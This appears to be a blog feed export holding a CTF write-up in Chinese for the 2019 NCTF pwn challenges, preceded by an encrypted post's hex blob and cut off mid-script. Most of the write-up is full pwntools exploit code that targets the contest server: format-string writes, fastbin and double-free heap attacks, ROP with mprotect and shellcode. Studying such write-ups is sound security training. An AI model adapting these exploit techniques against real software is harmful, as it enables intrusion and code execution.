475c439fb7dcbde6ce86655fab4a6c5c5ac150982efb2c2fd5143adaa8d67529368bb8f779f2a0f1d1064c6aa895ea49765d618b802fd30b69a745fab8cfd198b5eba57c4a491b5c53940eea66198f62c2fa9989c30855b2f0cddbf049ec7c7ded43e12220fdf72c8887f41fb8e8624cc2398903561fcc5767345e185a2fc0ed308044facdfffdce57e85d87c1d2e994b80b93cbfc0f56826abca163d5db2fb7a309a15012080be61954eb614a7b83d6fd34299ad565e0890f2b98fbd4241f35d43ae12153c69e66a28b4ec3196af95064bf5b75e92bccf5e5a3ee09c0eaadcf71349cb12283fd13416f241880f10bc37a1578875e17b29fe234aef0c0d0feb91e40b0df01b5d6113f10e1182a4e08056100a7a71230e1d44fc6d9d1317d40f1d51870e7e071cc228b9103c4de8a1562d340efbf593cfddef03154f03309189b71d86c81a7c5b280e74ccd32fc2eecbcaf2035069107070149fbfcf5bc91d2c3a190ef92678882652da699b8f6211a446ce5315c113bddc2c49c8773fdd007c80de9a36c2530044dd5a87036aad716ff35fd5076e90ccc1a2f1e97af90aa6f4090d9f1eb08446d5c3b9dfe5792b1a658c1b82e182861dc7ddb26d946f9af767483b6bbff962d11662b8910e0341bb3164c7d5ef3e5685a556546fe28c3b55f5eaf90a6499e7dd06bdb81e5c4ad84aef8034d2c67e1de2423a6085d7ddcf5edf8f8640bf035e42fbb3b430306443bc49ac05730d5d77c17f0c3cd21553448c89d4f9886009f7d57a7da281bdea79f275413181eb7d3f66a792be7a053d3d56e69f065f308c92290ef9e0a7953590d2465a7546ec28531635ed6c54d3201a2ec653aed52bbe6f3af5a66275a6e26bc8618d9b8f162b102aab1435207a290585ff1050dde57b3cf5b29f3a38793d9037c88dadbce60df6e9445000c9a922580cf88dad7182e66243691f138819a79c3d84b733098dc507aa3a925b09da14be8cca000cd548334b85681e5de11ea94c0335c733fbd7baf908aa0e03967834d50fff231de6f4462e8a6421ec0cc105f8912adf0e84b24975da939977aff2440b007f5b6c3eced98652728541dfca9d01770978be2b81f5121b84c51de7ed69e83a13e5d7fc983ef38ef5eaa8ed5e1f0d5dcad48532489a70b1bcf0df3be0a49fb435c8b2bc5132aa9f1053eff68109b7497b099a5b315f6bf845208919d49048bfa0bc296cf63810277ed294be16060ccc316a44722e23331aa91ee7bbd5b6b4d8464f271a9f3686f1314b791360697a39cf188588fbeaae8c8498f9681a56c2d805b99abb1a50e0bda40c6bb27a36b56a887b79c16c4e6129a42f73e7b818cf2bef9c88571800b80ca28d6619e484fb611313ecb4780d9d618ca19a13d891a428c5c46f3c981ba42e794f5e2f0c11a4dcc29179eb5a44e4f5edab05d90b450db392a8b91540144198cb7e08b4bd58324e750d20b2fb7aaa9ce65a594c6441d5db8af8d623f452d9efb92ecfe5a9d1df0bbc4caff98c046dd09c31c79b5c443426dbea14b86969f016e6503ba40d8011f6478d344c268dd6b2e4eca9538bd9cc9b0d40b6e0b043cfadbfb8a99b7451ed3218d1b64ce7db8bbe00e0e393b3725e75f1bf73ab175580f81f16d78d0e1494c04f65f7dded2eb52f89c124f422948cda24274aa639304af1a2f7a79a5bf36130652be4b813220d07752cc5fd550dc953e2b30d24609d0963c325317d2bdd0a226bd27497182601fa200c3ccd6ce0cd2f4cc438c5e8966ad2f6f6cea74035ddd16b32284df813f0b9f86480e14161a4249d48913a29bb8cf75dc0f55938fcc5b7ff04161867d8a7634460684383858d9afc3775d6dd6301de923495d968793170b1867984a2d5d886743947499e34a2f1dc76887f28906f74db80447d7b74144387d4be7c618c8d67e0c830a5eca85a082a22daf52d3b48b2a7e75bdb502d5463e25701db111b9974a8292dec1791764af871a5bd92445ab53519a5383b1fd968dd9367c1f41be6fe83523e0885509f717d706f7f05c2558d08448a5da8bc018b1fa0b74461295d1a4e37180eba36ce71e1b43e5a99c8aa291ea04f7d43f1432656cb0a7c89708a81160f26c01469cdabf31ad5fea56c1a5e7ebdb48372943c1ae3028de01e8b111b69005dcf7f9eccd5f892742cd8e72db492b57c891838e74604c6d46689c1802989948e3644dc4edc14c22dc11254556c7084d095c8e01835a0987f065b83717077efc0d4c30f7ccf421a5f333a7e287de5e1d76271559796134c9f31cda08b3d9298a4695f94e87aa727731c4bb2d2e8dcb17fcc8b8fa8bdfe14b337ba5c5aff072038cd6cb1c883ce9203d474de29ed2eaad8c0bb642f7d189d7d2b7f55f13bb7b16477e9261384871919ae6bc12cd4c31a6dec006d13a028b7b033e77cbf933bd25208114a7565dc8d7931f044233c0eb461b7dc60ee3d097b9f9d6a823f74a2452f6f749b4f8ed83ed4e9e2adf1b2e799247d601b62bf9265cbe26ce1a3b3c1bfe60da62642f2df3ff89db7a8f9a620f49fdba68dcd374abd20e6f2c1a09aaa6809d6dac82e4feb162f61ae4eb907b978b21fd5e06b457f700c3f5fcb0876b46ffa84c9b5bec8a308cc8899dfff3798a48c353eaf213e2d2855d7f977b28798658889fe7e6371a96bc3d5b0e371c302a9db5927bb67689062a4bf4f32ae90a98389342bbd015276eecd459bc94f354e0f08cd02c57f43bc818b99fd3b766e61ca209a5bf8fee547e15a4ca82187db8b4cc567770812717016362f4c4a2e88125c764af274a75a5c03300439ea40ec0428ab0f29ce2da5eec7904cb0b93a62caf06b6d90faaf20e83bc800863f8600f0c6ba82e08301eff33f55858c8fb64a8f3d7794edbd869bc88f1a7ac3e73313291e61bd190dcb4777361e095691cbe84a11f979b9fd00977613974db346fb44a4f28d387df42602b009b994365a0b3a4916a1592adf6b19e30edd23599e0fe30c7c419f290e01b3347987869caa257c1346238a03689d49416f438d946cf536144afa992aa3af3fda96209778c61f0fad17bc691be4c9f4c4d69c2d85eded0f59ac6fe38c4724430686cd8e65345e3d635ffa07335e825620adb92377524569a157cb222c51da3f27c0b1ffe5bdb401a1208b98418a2c7b88b8160baa6d328ebbfab5513db0a3a6a28457100b1bc7389a4c64fec4a95d02c5c7bb706f9caa923fe3b1d58ba40a5588796db4c366d7c6acc99378c9c3dd976140f844c7463abe03be0e452b7bc50ef1e90120d76e2798a7c9cbe1ac8332fe83aa544c56f9db68b1661e8bec5b29b1ede2dc19e614ff75f69380f8d3b3c8fde8ebe84ae7a8ea69bcfd8c1e6bd4ef3c30d768f2b4acdd42e26ab5c386472fae63d1036b1a587db5ecccc7482f272ec9a74bbcf081f32c9b541bdd8e2408c12f5832190ec590de46b468af3c44077d8b2724ebc4ca641d9d9d23aba683a3960e5b83b3c9781628acdd83921c4a9e2a470d4e279628f3c99e32f35a95a88219d4ea98e29363b311f0642445783ad538ec527c8eb767a7be8cf9062e854a16f4ee6861ca22e79d13a945b61c80a35c1535c570980b835130666034ba1dd8f2c0e7d45b029834dd4d8c02ed36684e39c3e5bae7abe98e7a5cda6f03e789872c5f4b50ec611c4a94be91ee9d3473acb3337bc826d3ac5438bc3507a1cda4b75e8dcc902ddf286292efaf632f5baba93c4308d3c76d497687033b34bc20c54f2842b84397e3cbc5320908e096fa8756c46774f78144b3fe6464f54d340aac77d5f96824fae002d233f9c09d5fab893e4ad76911c7eac0691b7b54adde2bb1110c0b496bb806f5b35d3a628f3d6a576ff92cc052c39ae0a52d10d50fd1be20a14048e58c3d54439fbe83ed84aa2cc49afc4868522da98f60d8c15e7e9db3db8983d151d7d0425c24f2d5ee23befe21701e4f905810d19a5539454650dc8a99178b7bdd081d6758ec81fab81e80d5e22fc48e435fdc09ae53f220991eeff683c23f7fc068a657cd3f5872b3f9d321808fd335866dc1010d06687604f421bd6f09a1b89337da086805f7f50bee144308545fe67e41b7394ea4f8ad393f1f7584c0be05d938a4e2b00b905f9468bdd3f8bc9bc93481466de33b3080952b87d9da13259fad125f5ef50503580ce634d89c42342e63b4d1f467677679b9caf70074b89f833e86bc79a65fade6116f3688cc60dce78b251313fe887c8692ce767768acab23147cde2c3ae83b4670dfc6786759b169bf7b2b74a34fb52a6d95a3e747138d269d202159e313ecea2c5cba0b17b4ed862818d31f03bb29f6aece0145522535ff100173c490bf27eb11bb0b67a2989ce05baf1180e6ada5f89310b526ab918f35cf5674d7115f71268021055e1cc81c69e6e2fa539ff1fa7d986ba63e8fa8fe</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      该文章被加密了，请联系管理员请求密码。
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>CTF-NCTF-19年11月</title>
    <link href="http://yoursite.com/2019/11/24/CTF-NCTF-19%E5%B9%B411%E6%9C%88/"/>
    <id>http://yoursite.com/2019/11/24/CTF-NCTF-19%E5%B9%B411%E6%9C%88/</id>
    <published>2019-11-24T05:55:02.000Z</published>
    <updated>2019-11-26T01:54:48.000Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="CTF-2019NCTF-南邮CTF"><a href="#CTF-2019NCTF-南邮CTF" class="headerlink" title="CTF-2019NCTF-南邮CTF"></a>CTF-2019NCTF-南邮CTF</h1><h3 id="前言：帮朋友的战队打了一下比赛，ak了pwn，原本觉得新生赛应该学不到什么东西，只能提高自己的熟练度，发现有一题学到了一个新的东西，发现了自己的盲点，感谢出题人。"><a href="#前言：帮朋友的战队打了一下比赛，ak了pwn，原本觉得新生赛应该学不到什么东西，只能提高自己的熟练度，发现有一题学到了一个新的东西，发现了自己的盲点，感谢出题人。" class="headerlink" title="前言：帮朋友的战队打了一下比赛，ak了pwn，原本觉得新生赛应该学不到什么东西，只能提高自己的熟练度，发现有一题学到了一个新的东西，发现了自己的盲点，感谢出题人。"></a>前言：帮朋友的战队打了一下比赛，ak了pwn，原本觉得新生赛应该学不到什么东西，只能提高自己的熟练度，发现有一题学到了一个新的东西，发现了自己的盲点，感谢出题人。</h3><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h2 id="0x01-pwn-me-100-year-II"><a href="#0x01-pwn-me-100-year-II" class="headerlink" title="0x01 pwn me 100 year!(II)"></a>0x01 pwn me 100 year!(II)</h2><hr><h3 id="第一个read可以输入-p导致pie泄露，然后确定key的位置，然后printf的格式化字符串漏洞改一下值就好了"><a href="#第一个read可以输入-p导致pie泄露，然后确定key的位置，然后printf的格式化字符串漏洞改一下值就好了" class="headerlink" title="第一个read可以输入%p导致pie泄露，然后确定key的位置，然后printf的格式化字符串漏洞改一下值就好了"></a>第一个read可以输入%p导致pie泄露，然后确定key的位置，然后printf的格式化字符串漏洞改一下值就好了</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn_me_2")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"> global lib</span><br><span class="line"> global sh</span><br><span class="line"> if(debug == 1):</span><br><span class="line">  sh = process("./pwn_me_2")</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> else:</span><br><span class="line">  sh = remote(ip,port)</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> sh.sendlineafter(':',"a" * 0x10 + "%p\x00")</span><br><span class="line"> sh.recvuntil("preparing......\n")</span><br><span class="line"> pie = int(sh.recvuntil("pwn me 100",True),16) - 0x563519b85080 + 0x563519983000</span><br><span class="line"> key = pie + 0x2020E0</span><br><span class="line"> payload = "%" + str(0x6666) + "d%10$hn%11$hn"</span><br><span class="line"> payload = payload.ljust(0x30 - 0x10,'\x00')</span><br><span class="line"> payload += p64(key) + p64(key+2)</span><br><span class="line"> sh.sendlineafter("?",payload)</span><br><span class="line"> sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"> pwn("139.129.76.65",50005,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x02-pwn-me-100-year-III"><a href="#0x02-pwn-me-100-year-III" class="headerlink" title="0x02 pwn me 100 year!(III)"></a>0x02 pwn me 100 year!(III)</h2><hr><h3 id="先利用malloc和free在read之后的末尾字节未置零从而实现heap-leak，edit功能存在0x10字节的溢出，利用fastbin-attack即可修改heap头的堆块，触发backdoor"><a href="#先利用malloc和free在read之后的末尾字节未置零从而实现heap-leak，edit功能存在0x10字节的溢出，利用fastbin-attack即可修改heap头的堆块，触发backdoor" class="headerlink" title="先利用malloc和free在read之后的末尾字节未置零从而实现heap leak，edit功能存在0x10字节的溢出，利用fastbin attack即可修改heap头的堆块，触发backdoor"></a>先利用malloc和free在read之后的末尾字节未置零从而实现heap leak，edit功能存在0x10字节的溢出，利用fastbin attack即可修改heap头的堆块，触发backdoor</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn_me_3")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"> global lib</span><br><span class="line"> global sh</span><br><span class="line"> if(debug == 1):</span><br><span class="line">  sh = process("./pwn_me_3")</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> else:</span><br><span class="line">  sh = remote(ip,port)</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> def add(size,content):</span><br><span class="line">  sh.sendlineafter("exit","1")</span><br><span class="line">  sh.sendlineafter(":",str(size))</span><br><span class="line">  sh.sendafter(":",content)</span><br><span class="line"> def edit(idx,content):</span><br><span class="line">  sh.sendlineafter("exit","4")</span><br><span class="line">  sh.sendlineafter(":",str(idx))</span><br><span class="line">  sh.sendafter(":",content)</span><br><span class="line"> def free(idx):</span><br><span class="line">  sh.sendlineafter("exit","2")</span><br><span class="line">  sh.sendlineafter(":",str(idx))</span><br><span class="line"> def show(idx):</span><br><span class="line">  sh.sendlineafter("exit","3")</span><br><span class="line">  sh.sendlineafter("idx",str(idx))</span><br><span class="line"> add(0x18,'a' * 0x18)</span><br><span class="line"> add(0x18,'b' * 0x18)</span><br><span class="line"> free(0)</span><br><span class="line"> free(1)</span><br><span class="line"> add(8,'\n')</span><br><span class="line"> add(0,'')</span><br><span class="line"> show(0)</span><br><span class="line"> sh.recvuntil("\n")</span><br><span class="line"> heap_base = u64(sh.recvuntil("\n1,a",True)[-4:].ljust(8,'\x00')) - 0xa</span><br><span class="line"> log.success("heap_base: " + hex(heap_base))</span><br><span class="line"> add(0x18,'c' * 0x18)</span><br><span class="line"> free(2)</span><br><span class="line"> edit(1,'a' * 0x10 + p64(0x20) + p64(0x41))</span><br><span class="line"> free(0)</span><br><span class="line"> add(0x38,'a' * 0x18 + p64(0x21) + p64(heap_base))</span><br><span class="line"> add(0x18,p32(0xdeadbeef))</span><br><span class="line"> add(0x18,p32(0x66666666))</span><br><span class="line"> sh.sendline("5")</span><br><span class="line"> sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"> pwn("139.129.76.65",50006,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x03-warmup"><a href="#0x03-warmup" class="headerlink" title="0x03 warmup"></a>0x03 warmup</h2><hr><h3 id="导入ida看到开了沙盒，考虑使用orw，然后程序有read、printf、read，可以实现canary-leak，然后第二个read存在严重的栈溢出，然后puts一下got数据实现libc-leak，再回到main进行二次劫持，接着调用mprotect函数来设置bss段的数据可读可写可执行，然后再bss段上放好orwshellcode然后跳过去执行就可以拿到flag了，介于之前的题目中出现过cat-flag的字符串，所以猜测flag和elf在同一个目录下，所以直接open-“flag”-即可"><a href="#导入ida看到开了沙盒，考虑使用orw，然后程序有read、printf、read，可以实现canary-leak，然后第二个read存在严重的栈溢出，然后puts一下got数据实现libc-leak，再回到main进行二次劫持，接着调用mprotect函数来设置bss段的数据可读可写可执行，然后再bss段上放好orwshellcode然后跳过去执行就可以拿到flag了，介于之前的题目中出现过cat-flag的字符串，所以猜测flag和elf在同一个目录下，所以直接open-“flag”-即可" class="headerlink" title="导入ida看到开了沙盒，考虑使用orw，然后程序有read、printf、read，可以实现canary leak，然后第二个read存在严重的栈溢出，然后puts一下got数据实现libc leak，再回到main进行二次劫持，接着调用mprotect函数来设置bss段的数据可读可写可执行，然后再bss段上放好orwshellcode然后跳过去执行就可以拿到flag了，介于之前的题目中出现过cat flag的字符串，所以猜测flag和elf在同一个目录下，所以直接open(“flag”)即可"></a>导入ida看到开了沙盒，考虑使用orw，然后程序有read、printf、read，可以实现canary leak，然后第二个read存在严重的栈溢出，然后puts一下got数据实现libc leak，再回到main进行二次劫持，接着调用mprotect函数来设置bss段的数据可读可写可执行，然后再bss段上放好orwshellcode然后跳过去执行就可以拿到flag了，介于之前的题目中出现过cat flag的字符串，所以猜测flag和elf在同一个目录下，所以直接open(“flag”)即可</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("warm_up")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"> global lib</span><br><span class="line"> global sh</span><br><span class="line"> if(debug == 1):</span><br><span class="line">  sh = process("./warm_up")</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> else:</span><br><span class="line">  sh = remote(ip,port)</span><br><span class="line">  lib = ELF("libc-2.23.so")</span><br><span class="line"> pop_rdi_ret = elf.search(asm("pop rdi\nret")).next()</span><br><span class="line"> pop_rsi_r15_ret = elf.search(asm("pop rsi\npop r15\nret")).next()</span><br><span class="line"> sh.sendafter('!!!','a' * 0x19)</span><br><span class="line"> sh.recvuntil('a' * 0x18)</span><br><span class="line"> canary = u64(sh.recv(8)) - 0x61</span><br><span class="line"> payload = 'a' * 0x18 + p64(canary) + 'a' * 8</span><br><span class="line"> payload += p64(pop_rdi_ret)</span><br><span class="line"> payload += p64(elf.got['__libc_start_main'])</span><br><span class="line"> payload += p64(elf.plt['puts'])</span><br><span class="line"> payload += p64(0x400910)</span><br><span class="line"> sh.sendline(payload)</span><br><span class="line"> sh.recvuntil("?")</span><br><span class="line"> __libc_start_main = u64(sh.recvuntil("\nwarm",True)[-6:].ljust(8,'\x00'))</span><br><span class="line"> libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line"> system = libc +lib.symbols['system']</span><br><span class="line"> binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line"> gets = libc + lib.symbols['gets']</span><br><span class="line"> mprotect = libc+ lib.symbols['mprotect']</span><br><span class="line"> __free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line"> __malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line"> pop_rdx_ret = libc + lib.search(asm("pop rdx\nret")).next()</span><br><span class="line"> payload = 'a' * 0x18 + p64(canary) + 'a' * 8</span><br><span class="line"> payload += p64(pop_rdi_ret) + p64(elf.bss() + 0x500) + p64(gets)</span><br><span class="line"> payload += p64(pop_rdx_ret) + p64(7) + p64(pop_rsi_r15_ret) + p64(0x1000) + p64(0) + p64(pop_rdi_ret) + p64((elf.bss() >> 12) << 12) + p64(mprotect)</span><br><span class="line"> payload += p64(elf.bss() + 0x500)</span><br><span class="line"> sh.sendlineafter("!!!",'a')</span><br><span class="line"> sh.sendline(payload)</span><br><span class="line"> payload = ''</span><br><span class="line"> payload += shellcraft.open("flag")</span><br><span class="line"> payload += shellcraft.read(3,elf.bss()+0x100,0x30)</span><br><span class="line"> payload += shellcraft.write(1,elf.bss()+0x100,0x30)</span><br><span class="line"> sh.sendline(asm(payload))</span><br><span class="line"> sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"> pwn("139.129.76.65",50007,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x04-easy-heap"><a href="#0x04-easy-heap" class="headerlink" title="0x04 easy_heap"></a>0x04 easy_heap</h2><hr><h3 id="典型的fastbin-attack题目，一开始程序叫你输入一句话，可以输入伪造的size为，我们可以使用double-free实现fastbin-attack把chunk申请到伪造的size这里，由于chunk可以达到0x48的大小，所以可以修改chunk-max-size实现malloc无大小限制，同时修改到第一个chunk-ptr为got，然后show一下就可以知道libc-base了，然后再一次double-free-fastbin-attack打-malloc-hook，将其覆盖为one-gadget，然后malloc一下就可以拿到shell了。"><a href="#典型的fastbin-attack题目，一开始程序叫你输入一句话，可以输入伪造的size为，我们可以使用double-free实现fastbin-attack把chunk申请到伪造的size这里，由于chunk可以达到0x48的大小，所以可以修改chunk-max-size实现malloc无大小限制，同时修改到第一个chunk-ptr为got，然后show一下就可以知道libc-base了，然后再一次double-free-fastbin-attack打-malloc-hook，将其覆盖为one-gadget，然后malloc一下就可以拿到shell了。" class="headerlink" title="典型的fastbin attack题目，一开始程序叫你输入一句话，可以输入伪造的size为，我们可以使用double free实现fastbin attack把chunk申请到伪造的size这里，由于chunk可以达到0x48的大小，所以可以修改chunk_max_size实现malloc无大小限制，同时修改到第一个chunk_ptr为got，然后show一下就可以知道libc_base了，然后再一次double free+fastbin attack打__malloc_hook，将其覆盖为one_gadget，然后malloc一下就可以拿到shell了。"></a>典型的fastbin attack题目，一开始程序叫你输入一句话，可以输入伪造的size为，我们可以使用double free实现fastbin attack把chunk申请到伪造的size这里，由于chunk可以达到0x48的大小，所以可以修改chunk_max_size实现malloc无大小限制，同时修改到第一个chunk_ptr为got，然后show一下就可以知道libc_base了，然后再一次double free+fastbin attack打__malloc_hook，将其覆盖为one_gadget，然后malloc一下就可以拿到shell了。</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("easy_heap")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"> global lib</span><br><span class="line"> global sh</span><br><span class="line"> if(debug == 1):</span><br><span class="line">  sh = process("./easy_heap")</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> else:</span><br><span class="line">  sh = remote(ip,port)</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> def add(size,content):</span><br><span class="line">  sh.sendlineafter("4.","1")</span><br><span class="line">  sh.sendlineafter("?",str(size))</span><br><span class="line">  sh.sendafter("?",content)</span><br><span class="line"> def free(idx):</span><br><span class="line">  sh.sendlineafter("4.","2")</span><br><span class="line">  sh.sendlineafter("?",str(idx))</span><br><span class="line"> def show(idx):</span><br><span class="line">  sh.sendlineafter("4.","3")</span><br><span class="line">  sh.sendlineafter("?",str(idx))</span><br><span class="line"> chunk_list = 0x602080</span><br><span class="line"> chunk_size = 0x602078</span><br><span class="line"> sh.sendafter("?",p64(0x50) * 2)</span><br><span class="line"> add(0x48,'\x11' * 0x48)</span><br><span class="line"> add(0x48,'\x12' * 0x48)</span><br><span class="line"> free(0)</span><br><span class="line"> free(1)</span><br><span class="line"> free(0)</span><br><span class="line"> add(0x48,p64(0x602060))</span><br><span class="line"> add(0x48,p64(0x602060))</span><br><span class="line"> add(0x48,p64(0x602060))</span><br><span class="line"> payload = 'a' * 8 + p64(0x6666) + p64(elf.got['__libc_start_main'])</span><br><span class="line"> add(0x48,payload)</span><br><span class="line"> show(0)</span><br><span class="line"> __libc_start_main = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00'))</span><br><span class="line"> libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line"> system = libc +lib.symbols['system']</span><br><span class="line"> binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line"> __free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line"> __malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line"> one_gadget = 